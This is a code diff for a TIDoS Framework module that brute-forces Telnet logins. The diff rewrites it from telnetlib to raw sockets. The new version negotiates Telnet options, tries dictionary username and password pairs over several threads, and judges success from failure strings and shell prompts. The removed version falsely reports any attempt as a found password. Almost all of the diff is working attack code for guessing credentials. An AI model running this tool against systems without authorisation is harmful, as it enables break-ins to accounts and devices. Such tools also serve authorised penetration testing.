@@ -1,117 +1,118 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
+#
 #-:-:-:-:-:-:-:-:-:-:-:-:#
 #    TIDoS Framework     #
 #-:-:-:-:-:-:-:-:-:-:-:-:#
 
-#Author: @_tID
-#This module requires TIDoS Framework
-#https://github.com/0xInfection/TIDoS-Framework
+# This module requires TIDoS Framework
+# https://github.com/0xInfection/TIDoS-Framework
 
+"""Dictionary brute force of Telnet logins.
 
-import os
-import sys
-import time
+telnetlib was removed in Python 3.13, so this speaks just enough of the
+protocol itself: it refuses every negotiated option (so the server reaches
+the login prompt) and then matches the login/password prompts and the
+server's failure strings.
+"""
+
+from __future__ import annotations
+
 import socket
-from time import sleep
-import telnetlib
-from core.Core.colors import *
 
-from core.database.database_module import save_data
-from core.variables import database
-from core.methods.cache import targetname
-import inspect
+from core.methods import brute
+from core.methods.print import pbrute
 
-teluser = []
-telpass = []
+info = "Brute force Telnet credentials using dictionaries (raw-socket, no telnetlib)."
+searchinfo = "Telnet Login Cracker"
+properties = brute.options(port_default=23, threads_default=3)
 
-searchinfo = "Telnet Bruteforce"
-info = "Crack common Telnet credentials using dictionaries."
-properties = {}
+IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240
 
-def telnetBrute0x00(ip, usernames, passwords, port, delay):
-    telnet = telnetlib.Telnet(ip)
-    telnet.read_until("login: ")
-    found = False
-    for username in usernames:
-        for password in passwords:
-            try:
-                telnet.write(str(username) + "\n")
-                telnet.read_until("Password: ")
-                telnet.write(str(password) + "\n")
-                telnet.write("vt100\n")
-                print(G + ' [+] Username: %s | Password found: %s\n' % (username, password) + W)
-                telnet.close()
-                found = True
-                data = username + " : " + password
-                save_data(database, module, lvl1, lvl2, lvl3, name, data)
-            except socket.error:
-                print(R + " [-] Error: Connection failed! Port closed!" + W)
-            except KeyboardInterrupt:
-                telnet.close()
-                if not found:
-                    data = "Nothing found."
-                    save_data(database, module, lvl1, lvl2, lvl3, name, data)
-                sys.exit(1)
-            except Exception:
-                print(GR+ " [*] Checking : "+C+"Username: {} | ".format(username)+B+"Password: {} ".format(password)+R+"...\n")
-                sleep(delay)
-    if not found:
-        data = "Nothing found."
-        save_data(database, module, lvl1, lvl2, lvl3, name, data)
+LOGIN_PROMPTS = (b"login:", b"username:", b"user:")
+PASS_PROMPTS = (b"password:", b"passcode:")
+FAIL_MARKERS = (b"incorrect", b"login failed", b"authentication failed",
+                b"access denied", b"invalid", b"failed")
 
-def telnetbrute(web):
-    global name
-    name = targetname(web)
-    global lvl2
-    lvl2 = inspect.stack()[0][3]
-    global module
-    module = "VulnAnalysis"
-    global lvl1
-    lvl1 = "Brute Force Tools"
-    global lvl3
-    lvl3 = ""
-    time.sleep(0.6)
-    #print(R+'    =========================')
-    #print(R+'\n     T E L N E T   B R U T E ')
-    #print(R+'    ---<>----<>----<>----<>--\n')
-    from core.methods.print import pbrute
-    pbrute("telnet")
-                 
-    with open('files/brute-db/telnet/telnet_defuser.lst') as users:
-        for user in users:
-            user = user.strip('\n')
-            teluser.append(user)
-    with open('files/brute-db/telnet/telnet_defpass.lst') as users:
-        for passw in users:
-            passw = passw.strip('\n')
-            telpass.append(passw)
 
-    web = web.replace('https://','')
-    web = web.replace('http://','')
-    ip = socket.gethostbyname(web)
-    w = input(O+' [§] Use IP '+R+ip+' ? (y/n) :> ')
-    if w == 'y' or w == 'Y':
-        port = input(O+' [§] Enter the port (eg.23) :> ')
-        delay = input(C+' [§] Delay between each request (eg. 0.2) :> ')
-        print(B+' [*] Initiating module...')
-        time.sleep(1)
-        print(GR+' [*] Trying using default credentials...')
-        telnetBrute0x00(ip, teluser, telpass, port, delay)
-    elif w == 'n' or w == 'N':
-        ip = input(O+' [§] Enter IP :> ')
-        port = input(O+' [§] Enter the port (eg.23) :> ')
-        delay = input(C+' [§] Delay between each request (eg. 0.2) :> ')
-        print(B+' [*] Initiating module...')
-        time.sleep(1)
-        print(GR+' [*] Trying using default credentials...')
-        telnetBrute0x00(ip, teluser, telpass, port, delay)
-    else:
-        print(R+' [-] Sorry fam you typed shit!')
-        sleep(0.7)
-    print(G+' [+] Done!')
+def _recv_until(sock, prompts, timeout, limit=8192):
+    """Read, answering Telnet negotiation, until one of `prompts` (lowercased
+    byte strings) appears in the visible data. Returns the visible bytes."""
+    sock.settimeout(timeout)
+    visible = bytearray()
+    while len(visible) < limit:
+        try:
+            chunk = sock.recv(1024)
+        except socket.timeout:
+            break
+        if not chunk:
+            break
+        i = 0
+        while i < len(chunk):
+            byte = chunk[i]
+            if byte == IAC and i + 1 < len(chunk):
+                cmd = chunk[i + 1]
+                if cmd in (DO, DONT, WILL, WONT) and i + 2 < len(chunk):
+                    opt = chunk[i + 2]
+                    # Refuse everything: answer DO/WILL with WONT/DONT.
+                    reply = WONT if cmd == DO else DONT if cmd == WILL else None
+                    if reply is not None:
+                        try:
+                            sock.sendall(bytes([IAC, reply, opt]))
+                        except OSError:
+                            pass
+                    i += 3
+                    continue
+                if cmd == SB:               # skip subnegotiation until IAC SE
+                    j = i + 2
+                    while j + 1 < len(chunk) and not (chunk[j] == IAC and chunk[j + 1] == SE):
+                        j += 1
+                    i = j + 2
+                    continue
+                i += 2
+                continue
+            visible.append(byte)
+            i += 1
+        low = bytes(visible).lower()
+        if any(p in low for p in prompts):
+            break
+    return bytes(visible)
 
-def attack(web):
-    web = web.fullurl
-    telnetbrute(web)
+
+def _try_login(ip, port, user, password, timeout):
+    try:
+        sock = socket.create_connection((ip, int(port)), timeout=timeout)
+    except OSError as e:
+        raise ConnectionError(str(e)) from e
+    try:
+        banner = _recv_until(sock, LOGIN_PROMPTS, timeout)
+        if not any(p in banner.lower() for p in LOGIN_PROMPTS):
+            raise ConnectionError("no login prompt from telnet service")
+        sock.sendall(user.encode(errors="ignore") + b"\r\n")
+        _recv_until(sock, PASS_PROMPTS, timeout)
+        sock.sendall(password.encode(errors="ignore") + b"\r\n")
+        # Read the server's verdict: another login prompt or a failure marker
+        # means rejection; a shell-ish prompt with none of those means success.
+        reply = _recv_until(sock, LOGIN_PROMPTS, timeout).lower()
+        if any(m in reply for m in FAIL_MARKERS):
+            return False
+        if any(p in reply for p in LOGIN_PROMPTS):
+            return False            # re-prompted for login -> rejected
+        # Accept only on positive evidence of a session (a shell prompt).
+        return any(ch in reply for ch in (b"$", b"#", b">", b"welcome", b"last login"))
+    except (ConnectionError, socket.timeout):
+        raise
+    except OSError as e:
+        raise ConnectionError(str(e)) from e
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
+def attack(target):
+    pbrute("Telnet")
+    return brute.run(target, properties, proto="telnet", port_default=23,
+              try_login=_try_login, lvl2="telnetbrute", threads_default=3,
+              service="Telnet")
